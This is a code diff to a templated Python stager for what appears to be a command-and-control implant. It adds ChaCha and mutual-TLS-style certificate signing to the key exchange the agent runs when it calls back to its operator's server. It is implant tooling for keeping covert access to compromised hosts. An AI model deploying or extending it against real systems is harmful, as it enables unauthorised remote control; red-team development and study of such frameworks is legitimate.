@@ -16,9 +16,10 @@ import time
 import urllib.request
 
 {% include 'common/aes.py' %}
-{% include 'common/rc4.py' %}
+{% include 'common/chacha.py' %}
 {% include 'common/diffiehellman.py' %}
 {% include 'common/get_sysinfo.py' %}
+{% include 'common/mtls.py' %}
 {% include 'smb/comms.py' %}
 
 
@@ -29,6 +30,9 @@ class Stage:
         self.server = '{{ host }}'
         self.kill_date = '{{ kill_date }}'
         self.working_hours = '{{ working_hours }}'
+        self.agent_private_cert_key = {{ agent_private_cert_key }}
+        self.agent_public_cert_key = {{ agent_public_cert_key }}
+        self.server_public_cert_key = {{ server_public_cert_key }}
 
         if self.server.startswith("https"):
             hasattr(ssl, '_create_unverified_context') and ssl._create_unverified_context() or None
@@ -53,12 +57,14 @@ class Stage:
         return headers
 
     def execute(self):
-        # Diffie-Hellman Key Exchange
         client_pub = DiffieHellman()
-        public_key = str(client_pub.publicKey).encode('UTF-8')
-        hmac_data = aes_encrypt_then_hmac(self.staging_key, public_key)
+        agent_cert = signature_unsafe(b"SIGNATURE", self.agent_private_cert_key, self.agent_public_cert_key)
+        public_key = client_pub.publicKey
 
-        # Build and Send Routing Packet
+        nbytes = (public_key.bit_length() + 7) // 8
+        pub_bytes = public_key.to_bytes(nbytes, 'big')
+        message = pub_bytes+agent_cert
+        hmac_data = aes_encrypt_then_hmac(self.staging_key, message)
 
         routing_packet = self.packet_handler.build_routing_packet(staging_key=self.staging_key, session_id=self.session_id, meta=2, enc_data=hmac_data)
         b64routing_packet = base64.b64encode(routing_packet).decode('UTF-8')
@@ -76,8 +82,16 @@ class Stage:
         self.session_id = list(packet.keys())[0]
         self.packet_handler.session_id = self.session_id
         encdata = packet[self.session_id][3]
+
         data = aes_decrypt_and_verify(self.staging_key, encdata)
-        nonce, server_pub = data[0:16], int(data[16:])
+        data = data.encode('latin-1')
+        nonce = data[:16]
+        server_pub = int.from_bytes(data[16:784], byteorder='big', signed=False)
+        server_cert = data[784:848]
+
+        if not checkvalid(server_cert, b"SIGNATURE", self.server_public_cert_key):
+            print("Server certificate not valid")
+            return
 
         # Generate Shared Secret
         client_pub.genKey(server_pub)
